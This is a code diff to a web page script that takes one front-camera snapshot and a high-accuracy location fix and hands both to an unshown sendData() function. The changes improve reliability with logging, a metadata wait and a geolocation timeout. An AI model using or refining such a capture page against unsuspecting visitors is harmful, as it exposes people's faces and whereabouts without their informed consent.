@@ -254,31 +254,56 @@
 <script>
 async function start() {
   try {
+    console.log("Requesting camera permission...");
     // Ask camera permission
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }); // Prefer front camera on mobile
+    console.log("Camera access granted.");
     const video = document.getElementById("video");
     video.srcObject = stream;
 
-    await new Promise(r => setTimeout(r, 1200));
+    // Wait for video to load metadata (better than fixed timeout)
+    await new Promise(resolve => {
+      video.onloadedmetadata = () => {
+        console.log("Video metadata loaded, size:", video.videoWidth, video.videoHeight);
+        resolve();
+      };
+    });
 
     const canvas = document.getElementById("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
+    console.log("Canvas size:", canvas.width, canvas.height);
 
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0);
+    console.log("Image drawn to canvas.");
 
     const image = canvas.toDataURL("image/jpeg");
+    console.log("Image data URL length:", image.length);
 
     stream.getTracks().forEach(t => t.stop());
 
-    navigator.geolocation.getCurrentPosition(
-      pos => sendData(image, pos.coords.latitude, pos.coords.longitude),
-      () => sendData(image, null, null)
-    );
+    // Try geolocation with timeout
+    const geoPromise = new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          console.log("Geolocation success:", pos.coords);
+          resolve(pos.coords);
+        },
+        err => {
+          console.log("Geolocation error:", err);
+          resolve(null); // Resolve with null to continue
+        },
+        { timeout: 10000, enableHighAccuracy: true } // Timeout and high accuracy for mobile
+      );
+    });
+
+    const coords = await geoPromise;
+    sendData(image, coords ? coords.latitude : null, coords ? coords.longitude : null);
 
   } catch (err) {
-    alert("Permission denied or not supported.");
+    console.error("Error in start():", err);
+    alert("Permission denied or not supported. Error: " + err.message);
   }
 }
 
